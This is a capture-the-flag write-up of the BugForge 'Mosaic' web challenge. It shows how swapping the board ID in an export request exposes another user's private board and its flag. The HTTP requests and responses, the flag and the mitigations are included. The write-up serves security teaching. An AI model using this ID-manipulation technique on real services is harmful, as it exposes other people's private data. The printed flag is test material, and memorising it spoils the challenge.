# Mosaic — mosaic-001 — Export you board.

## Challenge Overview

- **Challenge:** Mosaic
- **Platform:** BugForge
- **Category:** Web Security
- **Vulnerability:** Broken Access Control / IDOR
- **Hint:** Export you board
- **Status:** Solved

## Objective

Investigate the Mosaic collaborative whiteboard application and identify a vulnerability in its board export functionality to retrieve the challenge flag.

## Tools Used

- **Burp Suite** — Intercepting and inspecting HTTP requests
- **Web Browser** — Interacting with the Mosaic application
- **Burp Repeater** — Modifying and replaying requests

## Methodology

### Step 1: Explore the Application

After accessing the Mosaic application, I explored its board management features.

I created a test board and inspected the application's API requests using Burp Suite.

The application exposed endpoints for creating, retrieving, and exporting boards.

Example board creation request:

```http
POST /api/boards HTTP/2
Host: lab-1791827691647-yc05sm.labs-app.bugforge.io
Content-Type: application/json
```

Request body:

```json
{
  "title": "Test",
  "description": "",
  "template": "blank",
  "visibility": "workspace"
}
```

The server returned a newly created board ID.

### Step 2: Investigate the Export Functionality

The challenge hint was **"Export you board"**, so I examined the application's export feature.

When exporting the default board, the browser sent the following request:

```http
GET /api/boards/1005/export HTTP/2
Host: lab-1791827691647-yc05sm.labs-app.bugforge.io
```

The server responded with `200 OK` and returned a JSON file containing the board title, description, items, and comments.

The response also included the header:

```http
Content-Disposition: attachment; filename="mosaic-board.json"
```

This confirmed that the application provided a JSON export endpoint.

### Step 3: Test Board ID Manipulation

To investigate whether the endpoint enforced authorization correctly, I modified the board ID in the URL.

I sent the following request using Burp Repeater:

```http
GET /api/boards/1004/export HTTP/2
Host: lab-1791827691647-yc05sm.labs-app.bugforge.io
```

I retained my authenticated session and replayed the request.

### Step 4: Analyze the Response

The server returned:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Disposition: attachment; filename="mosaic-board.json"
```

The response body contained:

```json
{
  "title": "Taylor’s private board",
  "description": "A separate workspace.",
  "flag": "bug{YDhKGo63WfqpB2lYA22PbHdxf2uwruqL}",
  "items": [],
  "comments": []
}
```

The board title indicated that the resource was private. However, the export endpoint returned its contents to my authenticated session.

This revealed the challenge flag.

## Vulnerability Analysis

### Broken Access Control / IDOR

The behavior is consistent with an object-level authorization vulnerability, commonly called **Insecure Direct Object Reference (IDOR)**.

The endpoint accepts a board identifier in the URL. If the backend retrieves and exports the requested board without checking whether the authenticated user has permission to access it, changing the identifier can expose another user's data.

**Affected endpoint:**

```http
GET /api/boards/{board_id}/export
```

**Observed behavior:**

- The export endpoint accepted board ID `1004`.
- The server returned `200 OK`.
- The response identified the board as Taylor's private board.
- The response included the challenge flag.

The precise authorization failure can be confirmed by comparing the export endpoint with the normal board retrieval endpoint for the same board ID.

## Flag

```text
bug{YDhKGo63WfqpB2lYA22PbHdxf2uwruqL}
```

## Recommended Mitigations

1. **Enforce server-side authorization:** Verify the authenticated user's permissions for every requested board.
2. **Protect export endpoints:** Apply the same access-control checks to exports as to normal board retrieval.
3. **Validate workspace membership:** Ensure that the user belongs to the relevant workspace and has the required board permissions.
4. **Avoid trusting client-supplied identifiers:** A board ID must never be treated as proof of authorization.
5. **Add authorization tests:** Test access to private boards owned by other users and verify that unauthorized export attempts are denied.

## Conclusion

The Mosaic challenge demonstrated how insufficient authorization checks in an export endpoint can expose private application data.

By following the challenge hint, inspecting HTTP traffic with Burp Suite, and modifying the board ID, I retrieved a private board's JSON export and discovered the flag.

**Key lesson:** Every endpoint that accesses an object—including download and export endpoints—must enforce object-level authorization on the server.